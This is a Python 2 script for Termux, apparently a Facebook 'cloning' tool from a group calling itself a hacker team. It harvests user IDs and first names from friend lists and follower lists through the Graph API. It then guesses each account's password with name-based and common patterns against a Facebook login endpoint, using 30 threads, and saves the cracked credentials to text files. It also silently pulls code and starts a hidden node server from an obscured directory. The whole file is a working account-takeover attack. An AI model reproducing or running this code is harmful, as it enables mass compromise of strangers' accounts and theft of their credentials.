#coding=utf-8

#!/usr/bin/python2

#RanaMZ=namtusunahuga

try:

    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests

    from multiprocessing.pool import ThreadPool

except ImportError:

    os.system("pip2 install requests")

    os.system("python2 your-name.py")

os.system("clear")

if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):

    os.system("apt update && apt install nodejs -y")

from requests.exceptions import ConnectionError

os.system("git pull")

if not os.path.isfile("/data/data/com.termux/files/home/mz-pro/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")

    os.system("cd ..... && pip install progress")

    os.system("cd ..... && npm install")

    os.system("cd ..... && node index.js &")

    os.system("clear")

    time.sleep(10)

elif os.path.isfile("/data/data/com.termux/files/home/mz-pro/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")

    os.system("#")

    os.system("cd ..... && node index.js &")

    os.system("clear")

bd=random.randint(2e7, 3e7)

sim=random.randint(2e4, 4e4)

header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}

reload(sys)

sys.setdefaultencoding("utf-8")

c = "\033[1;92m"

c2 = "\033[0;97m"

c3 = "\033[1;91m"

logo = """

\033[1;91m BAI BROTHER HACKER TEAM \033[1;92m USE FREE

\033[1;93mNEVAR GIVE UP

 \033[1;94mHACKING EXPART

\033[1;95mFAST TOOL

 \033[1;96m EASY TO USE

                                                      

   \033[1;91m-----------------------------------------------

   \033[1;93mAUTHOR:  Md Kamal Hossen Kamrul 

   \033[1;92mBROTHER: B-B H4CKER

   \033[1;94mFROM: BANGLADESH

   \033[1;91mWHATTSAPP: +01643597215

   \033[1;91m-----------------------------------------------

   \033[1;92m Ownar:Md Kamal Hossen

   \033[1;92m TEAM    :B-B H4CKER

   \033[1;91m-----------------------------------------------

   \033[1;91m-----------------------------------------------

    \033[1;92m             ENJOY FREE CLONING

\033[1;91m-----------------------------------------------

"""

def main():

    os.system("clear")

    print logo

    print("")

    print("\033[0;91m[ START MENU ]").center(50)

    print("")

    print("\033[1;96m[1]\033[1;92mSTART CRACKING....")

    print("")

    print("\033[1;95m[2]\033[1;92mjoin Telegram  Group ")

    print("")

    print("\033[1;91m[0]\033[1;91mEXIT ")

    print("")

    main_select()

def main_select():

    Mz = raw_input("\033[1;92m[#] \033[1;92mChoose Option --->\033[1;91m ")

    if Mz  =="1":

        menu()

    if Mz =="2":

        os.system("xdg-open https://t.me/+4-EsosqnSMlmOTc1/EFZDUDDgKGZ94yVZJi453K")

        main()

    elif Mz =="0":

        os.system("exit")

    else:

        print("[!] Please select a valid option").center(50)

        time.sleep(2)

        main()

def login():

    os.system("clear")

    print logo

    print("")

    print("\033[0;91m[ Login Menu ]").center(50)

    print("")

    print("\033[1;93m[1]\033[1;92mLogin Using Token")

    print("")

    print("\033[1;93m[2]\033[1;92m My Youtube Channel ")

    print("")

    print("\033[1;97m[3]\033[1;91mBack")

    print("")

    login_select()

def login_select():

    Mz = raw_input(" \033[1;93m Choose Option :\033[1;91m ")

    if Mz =="1":

        os.system("clear")

        print logo

        print("")

        print("[ login with token ]").center(50)

        print("")

        token = raw_input("[!] Token ? \033[0;90m")

        token_s = open(".fb_token.txt","w")

        token_s.write(token)

        token_s.close()

        try:

            r = requests.get("https://graph.facebook.com/me?access_token="+token)

            q = json.loads(r.text)

            name = q["name"]

            nm = name.rsplit(" ")[0]

            print("")

            print("\033[1;92mYour token login successfully").center(50)

            time.sleep(1)

            os.system("xdg-open https://t.me/+4-EsosqnSMlmOTc1/EFZDUDDgKGZ94yVZJi453K")

            time.sleep(1)

            menu()

        except (KeyError , IOError):

            print("")

            print("\033[1;91mToken invalid or account has checkpoint\033[0;97m").center(50)

            print("")

            time.sleep(2)

            login()

    elif Mz =="2":

        os.system("xdg-open https://youtube.com/channel/UCddp6aTUJwBHvP4Y4vz2oog")

    elif Mz =="3":

        main()

    else:

        print("")

        print("Select a valid option").center(50)

        print("")

        login_select()

def menu():

    global token

    os.system("clear")

    print logo

    try:

        token = open(".fb_token.txt","r").read()

    except (KeyError , IOError):

        login()

    try:

        r = requests.get("https://graph.facebook.com/me?access_token="+token)

        q = json.loads(r.text)

        nm = q["name"]

        nmf = nm.rsplit(" ")[0]

        ok = nmf

    except (KeyError , IOError):

        print("")

        print("login account has checkpoint").center(50)

        print("")

        os.system("rm -rf .fb_token.txt")

        time.sleep(1)

        login()

    except requests.exceptions.ConnectionError:

        print logo

        print("")

        print("Your internet connection failed").center(50)

        print("")

        time.sleep(2)

        menu()

    os.system("clear")

    print logo

    print("")

    print("\t\033[1;92mActive Token.... : " +nm)

    print("")

    print("\033[1;93m[1]\033[1;92mClone From Friendlist")

    print("")

    print("\033[1;97m[2]\033[1;92mClone From Public id")

    print("")

    print("\033[1;93m[3]\033[1;92mClone From Followers id")

    print("")

    print("\033[1;91m[0]\033[1;91mEXIT MY TOOL")

    print("")

    menu_select()

def menu_select():

        select = raw_input("\033[1;92m Choose Option : ")

        id=[]

        oks=[]

        cps=[]

        if select=="1":

                os.system("clear")

                print logo

                print("")

                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)

                z = json.loads(r.text)

                for s in z["data"]:

                        uid=s['id']

                        na=s['name']

                        nm=na.rsplit(" ")[0]

                        id.append(uid+'='+nm)

        if select =="2":

                os.system("clear")

                print(logo)

                print("")

                idt = raw_input("\033[1;93m[#] \033[1;92mPut ID Link :\033[1;93m ")

                os.system("clear")

                print logo

                try:

                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

                        q = json.loads(r.text)

                        print("[!] Target from : "+q["name"])

                except (KeyError , IOError):

                    print("")

                    print("\033[1;91your login account has checkpoint").center(50)

                    print("")

                    menu()

                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)

                z = json.loads(r.text)

                for i in z["data"]:

                        uid=i['id']

                        na=i['name']

                        nm=na.rsplit(" ")[0]

                        id.append(uid+'='+nm)

        elif select =="3":

                os.system("clear")

                print logo

                print("")

                idt = raw_input("\033[1;93m[#] \033[1;92mPut ID Link :\033[1;93m ")

                os.system("clear")

                print logo

                try:

                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)

                        q = json.loads(r.text)

                        print(" Target from  : "+q["name"])

                except (KeyError , IOError):

                    print("")

                    print("\033[1;91m login id has checkpoint").center(50)

                    print("")

                    time.sleep(3)

                    menu()

                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)

                z = json.loads(r.text)

                for i in z["data"]:

                        uid=i['id']

                        na=i['name']

                        nm=na.rsplit(" ")[0]

                        id.append(uid+'='+nm)

        elif select =="0":

            os.system("exit")

        else:

            print("")

            print("Please Select A Valid Option").center(50)

            time.sleep(2)

            menu_select()

        print("[#] \033[1;92mTotal IDs..... : "+str(len(id)))

        time.sleep(0.5)

        print("\033[1;93m[#] \033[1;91mPlease Wait Untill The Process Stop.....")

        print 47*("-")

        print('')

        def main(arg):

                user=arg

                uid,name=user.split("=")

                try:

                    pass1=name+"123"

                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

                    d=json.loads(q)

                    if 'www.facebook.com' in d['error_msg']:

                        print("\033[1;93m[Sher-CP] "+uid+" = "+pass1)

                        cp=open("mzcp.txt","a")

                        cp.write(uid+" = "+pass1+"\n")

                        cp.close()

                        cps.append(uid)

                    else:

                        if "access_token" in d:

                            print("\x1b[1;97m[Sher-OK] "+uid+" = "+pass1+"\x1b[1;0m")

                            ok=open("mzok.txt","a")

                            ok.write(uid+" = "+pass1+"\n")

                            ok.close()

                            oks.append(uid)

                        else:

                            pass2=name+"12345"

                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

                            d=json.loads(q)

                            if 'www.facebook.com' in d['error_msg']:

                                print("\033[1;93m[Sher-CP "+uid+" = "+pass2)

                                cp=open("mzcp.txt","a")

                                cp.write(uid+" = "+pass2+"\n")

                                cp.close()

                                cps.append(uid)

                            else:

                                if 'access_token' in d:

                                    print("\x1b[1;97m[Sher-OK] "+uid+" = "+pass2+"\x1b[1;0m")

                                    ok=open("mzok.txt","a")

                                    ok.write(uid+" = "+pass2+"\n")

                                    ok.close()

                                    oks.append(uid)

                                else:

                                    pass3=name+"786786"

                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

                                    d=json.loads(q)

                                    if 'www.facebook.com' in d['error_msg']:

                                        print("\033[1;93m[Sher-CP] "+uid+" = "+pass3)

                                        cp=open("mzcp.txt","a")

                                        cp.write(uid+" = "+pass3+"\n")

                                        cp.close()

                                        cps.append(uid)

                                    else:

                                        if 'access_token' in d:

                                            print("\x1b[1;97m[Sher-OK] "+uid+" = "+pass3+"\x1b[1;0m")

                                            ok=open("mzok.txt","a")

                                            ok.write(uid+" = "+pass3+"\n")

                                            ok.close()

                                            oks.append(uid)

                                        else:

                                            pass4=name+"1122"

                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

                                            d=json.loads(q)

                                            if 'www.facebook.com' in d['error_msg']:

                                                print("\033[1;93m[7DAY-CP] "+uid+" = "+pass4)

                                                cp=open("mzcp.txt","a")

                                                cp.write(uid+" = "+pass4+"\n")

                                                cp.close()

                                                cps.append(uid)

                                            else:

                                                if 'access_token' in d:

                                                    print("\x1b[1;97m[B-B-OK] "+uid+" = "+pass4+"\x1b[1;0m")

                                                    ok=open("Bbhacker.txt","a")

                                                    ok.write(uid+" = "+pass4+"\n")

                                                    ok.close()

                                                    oks.append(uid)

                                                else:

                                                    pass5="112233"

                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

                                                    d=json.loads(q)

                                                    if 'www.facebook.com' in d['error_msg']:

                                                        print("\033[1;93m[Sher-CP] "+uid+" = "+pass5)

                                                        cp=open("mzcp.txt","a")

                                                        cp.write(uid+" = "+pass5+"\n")

                                                        cp.close()

                                                        cps.append(uid)

                                                    else:

                                                        if 'access_token' in d:

                                                            print("\x1b[1;97m[Sher-OK] "+uid+" = "+pass5+"\x1b[1;0m")

                                                            ok=open("mzok.txt","a")

                                                            ok.write(uid+" = "+pass5+"\n")

                                                            ok.close()

                                                            oks.append(uid)

                                                        else:

                                                            pass6="223344"

                                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

                                                            d=json.loads(q)

                                                            if 'www.facebook.com' in d['error_msg']:

                                                                print("\033[1;93m[Sher-CP] "+uid+" = "+pass6)

                                                                cp=open("bbcp.txt","a")

                                                                cp.write(uid+" = "+pass6+"\n")

                                                                cp.close()

                                                                cps.append(uid)

                                                            else:

                                                                if 'access_token' in d:

                                                                    print("\x1b[1;97m[Sher-OK] "+uid+" = "+pass6+"\x1b[1;0m")

                                                                    ok=open("mzok.txt","a")

                                                                    ok.write(uid+" = "+pass6+"\n")

                                                                    ok.close()

                                                                    oks.append(uid)

                                                                else:

                                                                    pass7="pakistan"

                                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

                                                                    d=json.loads(q)

                                                                    if 'www.facebook.com' in d['error_msg']:

                                                                        print("\033[1;93m[Sher-CP] "+uid+" = "+pass7)

                                                                        cp=open("mzcp.txt","a")

                                                                        cp.write(uid+" = "+pass7+"\n")

                                                                        cp.close()

                                                                        cps.append(uid)

                                                                    else:

                                                                        if 'access_token' in d:

                                                                            print("\x1b[1;97m[Sher-OK] "+uid+" = "+pass7+"\x1b[1;0m")

                                                                            ok=open("mzok.txt","a")

                                                                            ok.write(uid+" = "+pass7+"\n")

                                                                            ok.close()

                                                                            oks.append(uid)

                except:

                        pass

        p = ThreadPool(30)

        p.map(main, id)

        print (" ")

        print (47*"-")

        print ("[!] Process has completed")

        print ("[!] Now You Get Out Total A her-CP/bb-Ok : "+str(len(cps)) + "/"+str(len(oks)))

        print (47*"-")

        raw_input("\t\x1b[0;97mPress enter to main menu back")

        menu()

if __name__ == '__main__':

    main()
